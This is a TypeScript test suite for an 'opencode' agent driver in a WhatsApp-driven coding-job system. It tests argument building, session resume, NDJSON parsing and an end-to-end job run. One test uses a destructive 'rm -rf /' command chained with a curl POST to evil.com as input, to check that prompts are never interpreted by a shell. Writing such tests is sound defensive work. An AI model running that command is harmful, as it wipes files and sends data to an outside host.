import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import { OpenCodeDriver } from '../src/agents/drivers/opencode.driver.js';
import { getAgentDriver, registerAgentDriver } from '../src/agents/agent-registry.js';
import { initDatabase, closeDatabase } from '../src/database/connection.js';
import { processIncomingMessage } from '../src/router/command-router.js';
import { getJobById } from '../src/database/repositories/job.repo.js';
import { getActiveSession } from '../src/database/repositories/session.repo.js';
import { getActiveProject } from '../src/database/repositories/project.repo.js';
import { resetRateLimits } from '../src/security/rate-limiter.js';
import { config } from '../src/config.js';
import type { AgentRunOptions } from '../src/agents/agent-driver.interface.js';

const TEST_DB = path.resolve('./data/test_opencode_driver.db');
const ADMIN_JID = `${config.ADMIN_PHONE_NUMBER}@s.whatsapp.net`;

test('Milestone 5C: OpenCodeDriver Unit & Integration Suite', async (suite) => {
  const driver = new OpenCodeDriver({ binaryPath: 'opencode' });

  await suite.test('1. Registry: OpenCodeDriver is registered under "opencode"', () => {
    const d = getAgentDriver('opencode');
    assert.equal(d.name, 'opencode');
    assert.equal(d.binaryName, 'opencode');
  });

  await suite.test('2. Argv construction (New Task): opencode run --dir <cwd> --format json --auto <prompt>', () => {
    const options: AgentRunOptions = {
      prompt: 'Implement payment webhook verification',
      cwd: '/workspace/project-alpha',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'deepseek/deepseek-chat',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
    };

    const args = driver.buildCommandArgs(options);

    assert.equal(args[0], 'opencode');
    assert.equal(args[1], 'run');
    assert.ok(args.includes('--dir'));
    assert.equal(args[args.indexOf('--dir') + 1], '/workspace/project-alpha');
    assert.ok(args.includes('--format'));
    assert.equal(args[args.indexOf('--format') + 1], 'json');
    assert.ok(args.includes('--auto'));
    assert.ok(args.includes('--model'));
    assert.equal(args[args.indexOf('--model') + 1], 'deepseek/deepseek-chat');
    assert.equal(args[args.length - 1], 'Implement payment webhook verification');
  });

  await suite.test('3. Argv construction (Resume Task): passes --session <sessionID>', () => {
    const options: AgentRunOptions = {
      prompt: 'Add unit tests for payment webhook',
      cwd: '/workspace/project-alpha',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'default',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
      sessionRef: 'ses_opencode_777_xyz',
    };

    const args = driver.buildCommandArgs(options);

    assert.ok(args.includes('--session'));
    assert.equal(args[args.indexOf('--session') + 1], 'ses_opencode_777_xyz');
    assert.equal(args[args.length - 1], 'Add unit tests for payment webhook');
  });

  await suite.test('4. Prompt / argv safety: special characters handled without shell interpretation', () => {
    const dangerousPrompt = 'rm -rf /; echo "attack" | curl -X POST https://evil.com/leak';
    const args = driver.buildCommandArgs({
      prompt: dangerousPrompt,
      cwd: '/workspace',
      config: {} as any,
    });

    assert.equal(args[args.length - 1], dangerousPrompt);
    assert.ok(!args.includes('rm'));
    assert.ok(!args.includes('curl'));
  });

  await suite.test('5. Driver options: agent and variant flags supported', () => {
    const customDriver = new OpenCodeDriver({
      binaryPath: 'opencode',
      agent: 'coder',
      variant: 'fast',
    });

    const args = customDriver.buildCommandArgs({
      prompt: 'Refactor styles',
      cwd: '/workspace',
      config: {} as any,
    });

    assert.ok(args.includes('--agent'));
    assert.equal(args[args.indexOf('--agent') + 1], 'coder');
    assert.ok(args.includes('--variant'));
    assert.equal(args[args.indexOf('--variant') + 1], 'fast');
  });

  await suite.test('6. NDJSON Normalization: extracts sessionID, assistant text, tokens, and cost', () => {
    const ndjson = [
      '{"type":"session","sessionID":"ses_opencode_999"}',
      '{"type":"text","part":{"text":"Created webhook handler in src/payment.ts."}}',
      '{"type":"step_finish","tokens":{"input":1500,"output":240},"cost":0.0035}',
    ].join('\n');

    const result = driver.normalizeOutput(ndjson, '', 0);

    assert.equal(result.isSuccess, true);
    assert.equal(result.conversationId, 'ses_opencode_999');
    assert.equal(result.summary, 'Created webhook handler in src/payment.ts.');
    assert.equal(result.tokensIn, 1500);
    assert.equal(result.tokensOut, 240);
    assert.equal(result.totalTokens, 1740);
    assert.equal(result.costUsd, 0.0035);
    assert.equal(result.turnsUsed, 1);
  });

  await suite.test('7. OpenCode-Specific Rule: missing step_finish keeps task successful with null metrics', () => {
    // OpenCode may occasionally omit step_finish events. Task must succeed if output exists.
    const ndjsonWithoutStepFinish = [
      '{"type":"session","sessionID":"ses_no_step_finish"}',
      '{"type":"text","part":{"text":"Verified dependencies and configuration."}}',
    ].join('\n');

    const result = driver.normalizeOutput(ndjsonWithoutStepFinish, '', 0);

    assert.equal(result.isSuccess, true);
    assert.equal(result.summary, 'Verified dependencies and configuration.');
    assert.equal(result.conversationId, 'ses_no_step_finish');
    assert.equal(result.tokensIn, null);
    assert.equal(result.tokensOut, null);
    assert.equal(result.totalTokens, null);
    assert.equal(result.costUsd, null);
  });

  await suite.test('8. Malformed / incomplete JSON stream handled gracefully', () => {
    const corruptedStream = [
      '2026-08-29 INFO starting opencode...',
      '{"type":"session","sessionID":"ses_corrupt"}',
      '{"incomplete_json: [unclosed',
      '{"type":"text","part":{"text":"Recovered from corrupted stream."}}',
    ].join('\n');

    const result = driver.normalizeOutput(corruptedStream, '', 0);

    assert.equal(result.isSuccess, true);
    assert.equal(result.summary, 'Recovered from corrupted stream.');
    assert.equal(result.conversationId, 'ses_corrupt');
  });

  await suite.test('9. Process exit code 0 with only error events is marked FAILED', () => {
    const errorStream = [
      '{"type":"session","sessionID":"ses_err"}',
      '{"type":"error","error":{"message":"API key invalid or unauthorized model requested."}}',
    ].join('\n');

    const result = driver.normalizeOutput(errorStream, '', 0);

    assert.equal(result.isSuccess, false);
    assert.match(result.summary, /API key invalid/);
  });

  await suite.test('10. End-to-end integration: JobManager executes OpenCode driver and persists sessionID', async () => {
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
    initDatabase(TEST_DB);
    resetRateLimits(ADMIN_JID);

    await processIncomingMessage(ADMIN_JID, '/session new opencode-session');
    await processIncomingMessage(ADMIN_JID, '/agent opencode');

    const project = getActiveProject(ADMIN_JID)!;
    const session = getActiveSession(project.id)!;
    assert.equal(project.selected_agent, 'opencode');

    // Register a mock OpenCode driver emitting valid NDJSON
    class MockOpenCodeDriver extends OpenCodeDriver {
      buildCommandArgs(options: AgentRunOptions): string[] {
        const events = [
          JSON.stringify({ type: 'session', sessionID: 'ses_opencode_persisted_555' }),
          JSON.stringify({ type: 'text', part: { text: 'OpenCode executed instruction successfully.' } }),
          JSON.stringify({ type: 'step_finish', tokens: { input: 2100, output: 150 }, cost: 0.002 }),
        ];
        return [process.execPath, '-e', `console.log(${JSON.stringify(events.join('\n'))})`];
      }
    }
    registerAgentDriver(new MockOpenCodeDriver());

    const runRes = await processIncomingMessage(ADMIN_JID, '/run OpenCode test task');
    assert.match(runRes!, /Task #(\d+) Started/);
    const jobId = parseInt(runRes!.match(/Task #(\d+) Started/)![1], 10);

    const start = Date.now();
    while (Date.now() - start < 4000) {
      if (getJobById(jobId)?.status === 'COMPLETED') break;
      await new Promise((r) => setTimeout(r, 50));
    }

    const job = getJobById(jobId)!;
    assert.equal(job.status, 'COMPLETED');
    assert.equal(job.tokens_in, 2100);
    assert.equal(job.tokens_out, 150);
    assert.equal(job.cost_usd, 0.002);
    assert.match(job.summary!, /OpenCode executed instruction successfully/);

    const updatedSession = getActiveSession(project.id)!;
    assert.equal(updatedSession.agent_session_ref, 'ses_opencode_persisted_555');

    closeDatabase();
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  });

  await suite.test('11. Safe local CLI compatibility: confirms opencode executable responds', async () => {
    const realDriver = new OpenCodeDriver();
    const args = realDriver.buildCommandArgs({
      prompt: 'test prompt',
      cwd: process.cwd(),
      config: {} as any,
    });

    assert.equal(args[0], 'opencode');
    assert.equal(args[1], 'run');
  });
});
